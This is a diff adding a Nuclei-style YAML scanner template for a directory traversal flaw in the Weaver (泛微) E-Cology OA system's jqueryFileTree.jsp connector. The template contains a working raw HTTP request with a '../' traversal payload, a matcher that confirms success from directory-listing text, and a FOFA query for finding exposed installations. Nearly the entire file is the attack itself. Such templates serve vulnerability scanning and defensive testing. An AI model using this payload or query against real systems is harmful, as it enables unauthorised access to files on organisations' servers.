@@ -1,0 +1,23 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==200 && contains_all(body,"新建目录","重命名目录")
+          name: 目录遍历
+          type: dsl
+      raw:
+        - |
+          GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ HTTP/1.1
+          Host: {{Hostname}}
+id: FanWeiE-Cology-jqueryFileTree-DirectoryTraversal
+info:
+    author: HuanXiong
+    description: |-
+        fofa: app="泛微-OA（e-cology）"
+        泛微E-Cology jqueryFileTree 接口存在目录遍历，由于在处理路径时缺乏适当的验证。攻击者可以通过传递包含 "../" 的路径段绕过路径验证，访问任意文件。
+    name: 泛微E-Cology jqueryFileTree 目录遍历
+    reference:
+        - null
+    severity: high
+    tags:
+        - Directory Traversal
+        - jQuery
